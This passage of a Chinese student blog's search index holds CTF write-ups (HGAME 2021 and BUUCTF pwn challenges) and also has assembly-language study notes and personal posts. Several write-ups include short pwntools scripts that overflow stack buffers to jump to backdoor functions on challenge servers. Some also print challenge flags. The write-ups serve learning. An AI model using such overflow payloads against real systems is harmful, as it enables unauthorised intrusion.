94 D1 D5 11 87  21 08 42 10 21 22 02 49   | :.......!.B.!&quot;.I<br>92 62 8F 0B B9 D2 B4 50  1C 3C 94 A5 A1 74 CB FF   | .b.....P.&lt;...t..<br>FF A7 A1 44 0C 20 83 16  CB 96 ED 81 68 54 41 44   | ...D. ......hTAD<br>49 3D 01 00 00 8B 80 B3  AB 00 00 00 02 08 14 00   | I=..............<br>00 00 B4 00 00 00 52 44  48 49 0D 00 00 00 0A 1A   | ......RDHI......<br>0A 0D 47 4E 50 89                                 | ..GNP.<br></code></pre></td></tr></table></figure><p>反转后保存成png文件，是一个长得很别致的flag</p><p><img src="/2021/03/02/HGAME2021-week2-writeup-0/mul2.png"></p><p>翻转一下就好</p>]]></content>
    
    
    <categories>
      
      <category>ctf-hgame2021</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HGAME2021-week1-writeup</title>
    <link href="/2021/03/02/HGAME2021-week1-writeup-0/"/>
    <url>/2021/03/02/HGAME2021-week1-writeup-0/</url>
    
    <content type="html"><![CDATA[<h1 id="HGAME-2021-Week1-Writeup–6vv"><a href="#HGAME-2021-Week1-Writeup–6vv" class="headerlink" title="HGAME 2021 Week1 Writeup–6vv+"></a>HGAME 2021 Week1 Writeup–6vv+</h1><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="whitegive"><a href="#whitegive" class="headerlink" title="whitegive"></a>whitegive</h3><p>c语言中字符串字面量的值是该字符串的首地址，因此用ida打开二进制文件找到“paSsw0rd”字符串的首地址为0x402012</p><p><img src="/2021/03/02/HGAME2021-week1-writeup-0/pwn1.png"></p><p><code>nc 182.92.108.71 30009</code></p><p>输入0x402012的十进制即可getshell</p><p><img src="/2021/03/02/HGAME2021-week1-writeup-0/pwn2.png"></p><p><code>hgame&#123;W3lCOme_t0_Hg4m3_2222Z222zO2l&#125;</code></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h3><p>Base16编码使用16个ASCII可打印字符（数字0-9和字母A-F）对任意字节数据进行编码。</p><p>Base32编码是使用32个可打印字符（字母A-Z和数字2-7）</p><p>Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、&#x2F;）将任意字节序列数据编码成ASCII字符串，另有“&#x3D;”符号用作后缀用途。</p><p><code>R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09</code></p><p>使用base64</p><p><code>GY4DMNZWGE3EINRVG5BDKNZWGUZTCNRTGMYDMRBWGU2UMNZUGMYDKRRUHA2DOMZUGRCDGMZVIYZTEMZQGMZDGMJXIQ======</code></p><p>使用base32</p><p><code>6867616D657B57653163306D655F74305F4847344D335F323032317D</code></p><p>使用base16</p><p><code>hgame&#123;We1c0me_t0_HG4M3_2021&#125;</code></p><h3 id="Galaxy"><a href="#Galaxy" class="headerlink" title="Galaxy"></a>Galaxy</h3><p>拿到一个pcapng文件，放进wireshark里流量分析，因为找的是图片，尝试搜索一下png，找到一个包</p><p><img src="/2021/03/02/HGAME2021-week1-writeup-0/galaxy1.png"></p><p>追踪TCP流</p><p><img src="/2021/03/02/HGAME2021-week1-writeup-0/galaxy2.png"></p><p>发现png格式图片信息，把它导出得到图片，ghex修改一下图片的尺寸后发现flag在图片下方</p><p>PNG文件结构分析<a href="https://my.oschina.net/ososchina/blog/801358">https://my.oschina.net/ososchina/blog/801358</a></p><p><img src="/2021/03/02/HGAME2021-week1-writeup-0/galaxy3.png"></p><p><img src="/2021/03/02/HGAME2021-week1-writeup-0/galaxy4.png"></p>]]></content>
    
    
    <categories>
      
      <category>ctf-hgame2021</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Buuctf-pwn-writeup</title>
    <link href="/2021/02/10/Buuctf-pwn-writeup-0/"/>
    <url>/2021/02/10/Buuctf-pwn-writeup-0/</url>
    
    <content type="html"><![CDATA[<h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>直接nc就能getshell</p><h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>下载二进制文件，发现有&#x2F;bin&#x2F;sh</p><p><img src="/2021/02/10/Buuctf-pwn-writeup-0/rip1.png"></p><p>找到后门函数</p><p><img src="/2021/02/10/Buuctf-pwn-writeup-0/rip3.png"></p><p>很明显的栈溢出，覆盖返回地址为后门函数即可</p><p><img src="/2021/02/10/Buuctf-pwn-writeup-0/rip2.png"></p><p>exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">sh</span>=remote(&#x27;node3.buuoj.cn&#x27;,26443)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*23+p64(0x401187)<br>sh.send(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>ida打开发现后门函数，直接打开flag.txt，就不用getshell了</p><p><img src="/2021/02/10/Buuctf-pwn-writeup-0/warmup1.png"></p><p>main函数</p><p><img src="/2021/02/10/Buuctf-pwn-writeup-0/warmup2.png"></p><p>sprint会打印后门函数的地址，gets函数造成栈溢出</p><p>exp</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">from pwn import *<br><span class="hljs-keyword">sh</span>=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29685</span>)<br><span class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">&#x27;WOW:&#x27;</span>)<br>addr=<span class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">72</span>+p64(<span class="hljs-keyword">int</span>(addr,<span class="hljs-number">16</span>))<br><span class="hljs-keyword">sh</span>.send(payload)<br><span class="hljs-keyword">sh</span>.interactive()<br></code></pre></td></tr></table></figure><h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>ida</p><p><img src="/2021/02/10/Buuctf-pwn-writeup-0/ciscn1.png"></p><p>gets造成栈溢出</p><p><img src="/2021/02/10/Buuctf-pwn-writeup-0/ciscn2.png"></p><p>覆盖返回地址exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">sh</span>=remote(&#x27;node3.buuoj.cn&#x27;,27073)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*56+p64(0x4006BE)<br>sh.send(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>覆盖浮点数exp</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-built_in">io</span> = remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span> , <span class="hljs-number">25077</span>)<br>payload = b<span class="hljs-string">&#x27;A&#x27;</span>*(<span class="hljs-number">0x30</span><span class="hljs-number">-0x4</span>) + p64(<span class="hljs-number">0x41348000</span>)   #浮点数转<span class="hljs-number">16</span>进制工具<br><span class="hljs-built_in">io</span>.sendline(payload)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure><h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><p>ida</p><p><img src="/2021/02/10/Buuctf-pwn-writeup-0/level1.png"></p><p><img src="/2021/02/10/Buuctf-pwn-writeup-0/level2.png"></p><p>buf长度128，读入0x200可溢出</p><p>exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">sh</span>=remote(&#x27;node3.buuoj.cn&#x27;,26339)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*136+p64(0x400596)<br>sh.send(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>汇编语言--学习笔记</title>
    <link href="/2021/01/14/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/01/14/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><h4 id="reg"><a href="#reg" class="headerlink" title="reg"></a>reg</h4><pre><code class="hljs">    ·AX BX CX DX：可分为H-L(高位-低位)共16位    ·BX      可寻址，默认段地址DS     ·cx：    通常用作loop指令循环次数    ·SI DI： 寄存器(不可分为H-L位，共16位)，可寻址    ·BP      可寻址，默认段地址SS    ·SP        不可用[bx+bp]/[si+di]寻址</code></pre><h4 id="sreg"><a href="#sreg" class="headerlink" title="sreg"></a>sreg</h4><pre><code class="hljs">段寄存器:    ·CS:IP    cpu当前读取指令地址：偏移地址    ·SS:SP    栈顶段地址:偏移地址    ·DS:[..]  访问数据段地址:偏移地址  (DS存放程序内存区段地址，即PSP的段地址SA)    ·ES       段寄存器</code></pre><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><pre><code class="hljs">    zf(6): 相关指令的结果是否(1/0)为零    pf(2)：相关指令执行后的结果所有bit位中1的个数是否(1/0)为偶数    sf(7)：相关指令执行后的结果是否(1/0)为负    cf(0)：记录相关指令的进位值和借位值    of(11)：是否(1/0)发生溢出    df(10)：</code></pre><h4 id="基于flag的条件转移指令"><a href="#基于flag的条件转移指令" class="headerlink" title="基于flag的条件转移指令"></a>基于flag的条件转移指令</h4><pre><code class="hljs">    ·je(equal)      等于则转移      zf=1    ·jne(not equal) 不等于则转移    zf=0    ·jb(below)      低于则转移      cf=1    ·jnb(not below) 不低于则转移    cf=0    ·ja(above)      高于则转移      cf=0且zf=0    ·jna(not above) 不高于则转移    cf=1或zf=1    ·jnc无进位或借位  cf=0</code></pre><h3 id="基本指令"><a href="#基本指令" class="headerlink" title="基本指令"></a>基本指令</h3><pre><code class="hljs">    ·mov/sub ax/al/ah,n/ax    ·add/sub ax,n/ax    ·段间转移           jmp far ptr 标号   修改为标号的段地址与偏移地址           jmp dword ptr 内存单元地址(两个字)  高地址字：段地址  低地址字：偏移地址    ·段内转移           jmp short 标号     八位位移(-128~127)           jmp near ptr 标号  十六位位移(-32768~32767)           jmp word ptr 内存单元地址    ·jcxz：if((cx)==0)jmp short 标号    ·ret:pop ip (近转移)    retf:pop ip;pop cs (远转移)    ·call             call 标号：push ip;jmp near ptr 标号           call far ptr 标号：push cs;push ip;jmp far ptr 标号           call 16位reg：push ip;jmp 16位reg           call word ptr 内存单元地址：push ip;jmp word ptr 内存单元地址           call dword ptr 内存单元地址：push cs;push ip;jmp dword ptr 内存单元地址    ·mul 乘法          mul reg/mul 内存单元          八位乘法：(AL)*reg/内存单元,结果存放在AX中          十六位乘法：(AX)*16位reg/内存单元，结果存放在DX(高)和AX(低)中      ·push/pop    ·inc ax : ax自增    ·dec ax : ax自减    ·loop s:循环s地址中的指令cx次        &#123;       mov cx,idata            s:                循环体                loop s        &#125;    ·and:逻辑与指令    ·or:逻辑或指令    ·ptr:指明数据尺寸 word/byte ptr    ·div:除数            AX(16)/8位数据=AL(商)AH(余)                 DX(高16位)AX(低16位)/16位数据=AX(商)DX(余)    ·dup:   db idata dup (idata、idata、idata)表示重复，与db/dw/dd配合使用    ·offset:取得标号的偏移地址    ·nop:空指令    ·adc：带进位加法指令    ·sbb：带借位减法指令    ·cmp 1,2 比较指令，做减法运算</code></pre><h3 id="Dosbox中Debug的常用指令"><a href="#Dosbox中Debug的常用指令" class="headerlink" title="Dosbox中Debug的常用指令"></a>Dosbox中Debug的常用指令</h3><pre><code class="hljs">    a (Assemble) 逐行汇编 a [address]    c (Compare) 比较两内存块 c range address    d (Dump) 内存16进制显示 d [address]或 d [range]    e (Enter) 修改内存字节 e address [list]    f (fin) 预置一段内存 f range list    g (Go) 执行程序 g [=address][address...]    h (Hexavithmetic) 制算术运算 h value value    i (Input) 从指定端口地址输入 i pataddress    l (Load) 读盘 l [address [driver seetor&gt;    m (Move) 内存块传送 m range address    n (Name) 置文件名　 n filespec [filespec...]    o (Output) 从指定端口地址输出 o portadress byte    p 执行循环、重复的字符串指令、软件中断或子例程。    q (Quit) 结束　 q    r (Register) 显示和修改寄存器 r [register name]    s (Search) 查找字节串　 s range list    t (Trace) 跟踪执行　 t [=address] [value]    u (Unassemble) 反汇编 u [address ]或range    w (Write) 存盘　 w [address[driver sector secnum&gt;</code></pre>]]></content>
    
    
    <categories>
      
      <category>智能学习机器人</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>+Mg的碎碎念</title>
    <link href="/2021/01/01/+Mg%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
    <url>/2021/01/01/+Mg%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="一点感想"><a href="#一点感想" class="headerlink" title="一点感想"></a>一点感想</h2><h3 id="01"><a href="#01" class="headerlink" title="01"></a>01</h3><p>学习过程中的琐碎知识点与方法，时时值得记录，记录下自己的学习轨迹，以求温故知新，不记下来的话，回望来时的路似乎有点空荡</p><h3 id="02"><a href="#02" class="headerlink" title="02"></a>02</h3><p>可能要学很多很多不同领域的知识，大概方便自己区分一下（？）</p><h3 id="03"><a href="#03" class="headerlink" title="03"></a>03</h3><p>会把学到的大大小小的知识点、解决的大大小小的问题、做过的大大小小的题都记下来，大概是个日记本</p><h3 id="04"><a href="#04" class="headerlink" title="04"></a>04</h3><p>blog模板有一些功能还不太会用，接下来会慢慢学习<br>该blog采用模板：fluid搭建，后续会加一些实用（花里胡哨）的功能，比如评论区和音乐播放器和友链（如果有hxd愿意的话）</p><h3 id="05"><a href="#05" class="headerlink" title="05"></a>05</h3><p>用国内网络访问会有亿点点慢，后期可能会换成私人服务器，如果有奇怪的bug存在，pls联系<a href="mailto:&#49;&#x37;&#53;&#54;&#x35;&#x36;&#55;&#x38;&#49;&#x34;&#x40;&#113;&#x71;&#46;&#99;&#x6f;&#x6d;">&#49;&#x37;&#53;&#54;&#x35;&#x36;&#55;&#x38;&#49;&#x34;&#x40;&#113;&#x71;&#46;&#99;&#x6f;&#x6d;</a></p><h3 id="06"><a href="#06" class="headerlink" title="06"></a>06</h3><p>关于页有我的github，可能后面会慢慢开始用，但现在是一片荒地（</p><h3 id="07"><a href="#07" class="headerlink" title="07"></a>07</h3><p>还没有决定方向，大概突然想学什么就学什么</p><h3 id="08"><a href="#08" class="headerlink" title="08"></a>08</h3><p>大概是要告诫自己：万丈高楼平地起，勿在浮沙筑高台</p>]]></content>
    
    
    <categories>
      
      <category>随记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>about</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<p>每一个伟大的成就都有一个微不足道的开始</p><p>$  Android学习进行中</p><p>$《操作系统编译与设计-NJU》学习进行中</p><p>$《Engineering a Compiler》阅读进行中</p><p>$《编译原理》阅读进行中</p><p>$《计算机网络自顶向下方法》阅读进行中</p><p>$《程序员的自我修养》阅读已完成</p><p>$《c++ primer plus》阅读已完成</p><p>$《汇编语言–王爽》阅读已完成</p><p>$《c primer plus》阅读已完成</p>]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>categories</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
</search>
